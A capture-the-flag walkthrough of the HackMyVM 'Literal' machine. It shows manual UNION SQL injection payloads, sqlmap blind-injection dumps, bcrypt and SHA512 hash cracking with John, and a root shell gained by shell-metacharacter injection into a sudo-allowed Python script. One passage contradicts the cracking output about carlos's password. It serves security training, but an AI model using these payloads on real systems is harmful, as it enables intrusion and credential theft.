# Literal

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Literal | Lanz | Beginner | HackMyVM |

**Summary:** Summary: The Literal machine exploits a vulnerable blog application containing multiple instances of SQL injection across different subdomains. The initial compromise involves conducting manual SQL injection attacks on the `blog.literal.hmv` platform to extract user credentials stored in bcrypt hashes. While these initial blog credentials (`carlos12`) fail to provide system access, further reconnaissance reveals a secondary subdomain (`forumtesting.literal.hmv`). Automated SQL injection via `sqlmap` on this forum extracts a SHA512 admin hash. Cracking this hash yields `forum100889`, which, through password mutation techniques, provides the valid SSH password (`ssh100889`) for user carlos. The privilege escalation vector exploits a Python script at `/opt/my_things/blog/update_project_status.py` that is executable by `carlos` with `sudo` privileges without a password requirement. This script performs unsanitized string concatenation in SQL queries, creating a command injection vulnerability when user-supplied arguments are passed directly to `os.system()` calls. By injecting shell metacharacters into the script arguments, an attacker can break out of the SQL context and execute arbitrary commands as root, leading to complete system compromise and flag acquisition.

---

## Reconnaissance

The initial reconnaissance phase begins with network discovery to locate the target machine within the 192.168.100.0/24 subnet. A PowerShell scanning tool identifies the target at 192.168.100.167:

```powershell
PS C:\> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
----------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.167 08:00:27:4C:64:E1 VirtualBox
```

With the target located, the environment is configured and nmap is executed to perform comprehensive port scanning:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ ip=192.168.100.167 && url=http://$ip
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-11 11:00 WIB
Nmap scan report for 192.168.100.167
Host is up (0.0028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 30:ca:55:94:68:33:8b:50:42:f4:c2:b5:13:99:66:fe (RSA)
|   256 2d:b0:5e:6b:96:bd:0b:e3:14:fb:e0:d0:58:84:50:85 (ECDSA)
|_  256 92:d9:2a:5d:6f:58:db:85:d6:0c:99:68:b8:59:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://blog.literal.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.75 seconds
```

The nmap output reveals two open ports: SSH on port 22 and HTTP on port 80. Notably, the HTTP title indicates a redirect to blog.literal.hmv, suggesting a virtual host configuration. This hostname is added to the local hosts file to enable proper resolution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ echo '192.168.100.167 blog.literal.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.167 blog.literal.hmv
```

## Initial Web Enumeration

Accessing the web application at blog.literal.hmv reveals a personal blog interface with ASCII art content and a login functionality:

![](image.png)

The HTML source code displays a blog template for user "c4TLoUis" with several pages including a login endpoint at /login.php. Directory enumeration is conducted using feroxbuster to discover all accessible endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ feroxbuster -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,log,js,css,jpg,zip,bak,pem -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://blog.literal.hmv/
 🚩  In-Scope Url          │ blog.literal.hmv
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, log, js, css, jpg, zip, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      321c http://blog.literal.hmv/images => http://blog.literal.hmv/images/
200      GET       62l      144w     2159c http://blog.literal.hmv/register.php
200      GET       78l      398w     3325c http://blog.literal.hmv/index.html
200      GET      536l      761w    10683c http://blog.literal.hmv/default.css
200      GET      422l      489w    19845c http://blog.literal.hmv/fonts.css
200      GET       54l      137w     1893c http://blog.literal.hmv/login.php
200      GET       78l      398w     3325c http://blog.literal.hmv/
200      GET     3215l    23470w  2317057c http://blog.literal.hmv/images/header-bg.jpg
302      GET        0l        0w        0c http://blog.literal.hmv/logout.php => login.php
200      GET        0l        0w        0c http://blog.literal.hmv/config.php
301      GET        9l       28w      320c http://blog.literal.hmv/fonts => http://blog.literal.hmv/fonts/
200      GET      164l     1001w    67619c http://blog.literal.hmv/fonts/fontawesome-webfont.eot
200      GET     1542l     2777w   118482c http://blog.literal.hmv/fonts/FontAwesome.otf
200      GET      146l      938w    80726c http://blog.literal.hmv/fonts/fontawesome-webfont.woff
200      GET      830l     3301w   102322c http://blog.literal.hmv/fonts/fontawesome-webfont.ttf
200      GET      414l    29858w   202471c http://blog.literal.hmv/fonts/fontawesome-webfont.svg
302      GET        0l        0w        0c http://blog.literal.hmv/dashboard.php => login.php
```

The directory enumeration reveals several key endpoints: register.php for account creation, login.php for authentication, and dashboard.php which requires authentication. A test account is created and the dashboard is accessed.

## SQL Injection Discovery

Upon accessing the authenticated dashboard at dashboard.php, a new endpoint is discovered at next_projects_to_do.php that displays project information. This endpoint is tested for SQL injection vulnerabilities:

![](image-1.png)

The next_projects_to_do.php page displays project data in what appears to be a database-backed query. Testing with the classic SQL injection payload `' OR 1=1-- -` confirms the vulnerability, dumping all records from the underlying query. Further testing reveals the query structure through ORDER BY enumeration using `Done' ORDER BY 6-- -`. Once the column count is determined to be 5, a UNION-based SELECT injection is constructed:

![](image-2.png)

Initial column enumeration confirms the UNION injection works with 5 columns:

```sql
' UNION SELECT 1,2,3,4,5-- -
```

![](image-3.png)

Database information is extracted through the payload:

```sql
' UNION SELECT 1, database(), user(), @@version, 5-- -
```

![](image-4.png)

The information_schema.tables query reveals the database structure. The vulnerable endpoint is successfully extracting table names from the blog database:

```sql
' UNION SELECT 1, table_name, 3, 4, 5 FROM information_schema.tables WHERE table_schema = 'blog'-- -
```

![](image-5.png)

Column enumeration for the users table shows all available fields:

```sql
' UNION SELECT 1, column_name, 3, 4, 5 FROM information_schema.columns WHERE table_name = 'users'-- -
```

![](image-6.png)

User credentials are extracted from the users table using:

```sql
' UNION SELECT 1, username, userpassword, 4, 5 FROM users-- -
```

![](image-7.png)

The complete user dataset including email addresses is dumped using:

```sql
' UNION SELECT 1, username, userpassword, useremail, 5 FROM users-- -
```

![](image-8.png)

This extraction reveals 17 user accounts with bcrypt hashes and email addresses. Notably, several email addresses reference a different subdomain called forumtesting.literal.hmv, suggesting an additional attack surface.

## Hash Cracking and Credential Recovery

The extracted bcrypt hashes are saved to a file for offline cracking:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ cat hashes.txt
test:$2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma
admin:$2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K
carlos:$2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW
freddy123:$2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK
jorg3_M:$2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG
aNdr3s1to:$2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm
kitty:$2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW
walter:$2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO
estefy:$2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa
michael:$2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km
r1ch4rd:$2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO
fel1x:$2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m
kelsey:$2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6.
jtx:$2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC
DRphil:$2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC
carm3N:$2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW
lanz:$2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e
```

John the Ripper is deployed against these bcrypt hashes using the rockyou.txt wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ john -w=/usr/share/wordlists/rockyou.txt hashes.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 17 password hashes with 17 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
butterfly        (estefy)
123456789        (freddy123)
monica           (r1ch4rd)
hellokitty       (kitty)
50cent           (DRphil)
slipknot         (jorg3_M)
michael1         (michael)
147258369        (fel1x)
kelsey           (kelsey)
741852963        (walter)
zxcvbnm,./       (jtx)
carlos12         (carlos)
12g 0:00:26:48 0.09% (ETA: 2026-05-01 23:33) 0.007460g/s 9.736p/s 61.17c/s 61.17C/s mariahcarey..germany1
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Several passwords are recovered; however, the carlos user's password does not appear to be "carlos12" in the standard wordlists. The focus shifts to the forumtesting subdomain discovered in the email addresses.

## Secondary SQL Injection: Forum Subdomain

The forumtesting.literal.hmv subdomain is added to the hosts file and investigated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ echo '192.168.100.167 forumtesting.literal.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.167 forumtesting.literal.hmv
```

The forum application contains a category.php endpoint with a SQL injection vulnerability in the category_id parameter:

![](image-9.png)

sqlmap is used to automate exploitation of this vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" --batch --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
...
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=2 AND (SELECT 9082 FROM (SELECT(SLEEP(5)))PZcw)
...
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
...
available databases [3]:
[*] forumtesting
[*] information_schema
[*] performance_schema
...
```

![](image-10.png)

The forumtesting database is dumped to extract sensitive information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=2" -p category_id -D forumtesting --dump --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
...
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=2 AND (SELECT 9082 FROM (SELECT(SLEEP(5)))PZcw)
...
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
...
Database: forumtesting
Table: forum_owner
[1 entry]
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| id | email                           | created    | password                                                                                                                         | username |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
```

This extracted hash belongs to the forum's carlos user and is in SHA512 format. The hash is cracked using John:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ john -w=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 carlos_hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
forum100889      (?)
1g 0:00:00:01 DONE (2026-04-11 13:46) 0.7751g/s 6251Kp/s 6251Kc/s 6251KC/s fourbullet..formy6600
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John returns "forum100889" as the password result. While this does not work directly as the SSH password for user carlos, the pattern suggests trying "ssh100889" as the actual password, which proves successful.

## SSH Access and User Enumeration

SSH access is established using the recovered credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/literal]
└─$ ssh carlos@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may be upgraded. See https://openssh.com/pq.html
carlos@192.168.100.167's password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

   System information as of Sat 11 Apr 2026 06:48:19 AM UTC

   System load:  0.13               Processes:               129
   Usage of /:   20.3% of 33.99GB   Users logged in:         0
   Memory usage: 63%                IPv4 address for enp0s3: 192.168.100.167
   Swap usage:   13%


141 updates can be installed immediately.
2 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Apr 11 05:17:23 2026 from 192.168.100.1
carlos@literal:~$ id;whoami;hostname
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
carlos
literal
```

System enumeration reveals the user context. The sudo configuration is checked to identify any available privilege escalation vectors:

```bash
carlos@literal:~$ sudo -l
Matching Defaults entries for carlos on literal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin

User carlos may run the following commands on literal:
    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
```

The sudo configuration grants carlos permission to execute /opt/my_things/blog/update_project_status.py as root without password authentication. The wildcard parameter (* ) allows arbitrary arguments to be passed to the script.

## Privilege Escalation via Python Script Injection

The vulnerable script is examined to understand its functionality:

```bash
carlos@literal:~$ cat /opt/my_things/blog/update_project_status.py
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```

The critical vulnerability exists in the query_by_id and execute_query functions. The query_by_id function constructs a SQL query through direct string concatenation without any sanitization of the arg_project_id parameter:

```python
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")
```

This concatenation is then passed to os.system(), which executes the entire string as a shell command. By injecting shell metacharacters within the argument, command execution can be achieved at the root privilege level. The injection payload breaks out of the MySQL context and executes arbitrary shell commands:

```bash
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '1"; sudo -i; #'
+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
+-------+-----------------------------------------+---------------------+------------+-----------+
root@literal:~#
```

The injection payload `1"; sudo -i; #` functions by closing the SQL string with a quote and semicolon, then executing the `sudo -i` command to spawn an interactive root shell. The hash symbol (#) comments out any remaining SQL syntax. This results in immediate root access.

## Flag Acquisition

With root privileges obtained, both the user and root flags are retrieved:

```bash
root@literal:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
literal
root@literal:~# cat /root/root.txt /home/carlos/user.txt
ca4[REDACTED]
6d3[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance:** Network scanning identified the target machine at 192.168.100.167. Port enumeration revealed SSH on port 22 and HTTP on port 80, with virtual host redirection to blog.literal.hmv.

2. **Vulnerability Discovery:** Directory enumeration discovered multiple authentication-protected endpoints. Testing revealed SQL injection vulnerabilities in the next_projects_to_do.php endpoint on the blog subdomain and the category.php endpoint on the forumtesting subdomain.

3. **Exploitation:** UNION-based SQL injection techniques extracted 17 user accounts with bcrypt password hashes from the blog database. Additional SQL injection via sqlmap compromised the forumtesting database to reveal a SHA512 hash for the forum admin account.

4. **Internal Enumeration:** Offline password cracking using John the Ripper against both hash types recovered credentials. SSH access as user carlos was achieved using recovered credentials derived from the forum database hash.

5. **Privilege Escalation:** Post-exploitation enumeration revealed that user carlos could execute /opt/my_things/blog/update_project_status.py as root without password authentication. Command injection through unsanitized string concatenation in the Python script's query_by_id function enabled arbitrary command execution with root privileges, leading to complete system compromise.
